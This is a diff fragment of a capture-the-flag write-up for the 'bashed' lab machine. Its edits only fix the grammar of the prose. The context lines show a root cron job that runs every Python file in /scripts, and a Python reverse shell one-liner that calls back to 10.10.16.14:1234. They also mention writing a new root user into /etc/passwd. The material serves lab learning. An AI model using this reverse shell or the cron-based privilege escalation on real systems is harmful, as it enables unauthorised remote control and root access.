@@ -249,10 +249,10 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">User www-data may run the following commands on bashed:
 </span></span><span class="line"><span class="cl">    <span class="o">(</span>scriptmanager : scriptmanager<span class="o">)</span> NOPASSWD: ALL
-</span></span></code></pre></div><p>I run the PSPY and found hidden cron task.</p>
-<p>Seems like root runs python script in script folder.</p>
+</span></span></code></pre></div><p>I ran the PSPY and found hidden cron task.</p>
+<p>Seems like root runs python script in the script folder.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023/11/10 13:54:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">43970</span>  <span class="p">|</span> /bin/sh -c <span class="nb">cd</span> /scripts<span class="p">;</span> <span class="k">for</span> f in *.py<span class="p">;</span> <span class="k">do</span> python <span class="s2">&#34;</span><span class="nv">$f</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">done</span>
-</span></span></code></pre></div><p>I made reverse shell in python but the connection is cut off every immediately.</p>
+</span></span></code></pre></div><p>I made reverse shell in python but the connection gets cut off immediately.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@bashed:/scripts$ <span class="nb">echo</span> <span class="s2">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;</span>10.10.16.14<span class="s2">&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;</span>/bin/sh<span class="s2">&#34;,&#34;</span>-i<span class="s2">&#34;]);&#34;</span> &gt; shell.py
 </span></span><span class="line"><span class="cl">&lt;<span class="o">)</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">&#34;/bin/sh&#34;</span>,<span class="s2">&#34;-i&#34;</span><span class="o">])</span><span class="p">;</span><span class="s2">&#34; &gt; shell.py
 </span></span></span></code></pre></div><p>I added a script that writes new root user in /etc/passwd</p>
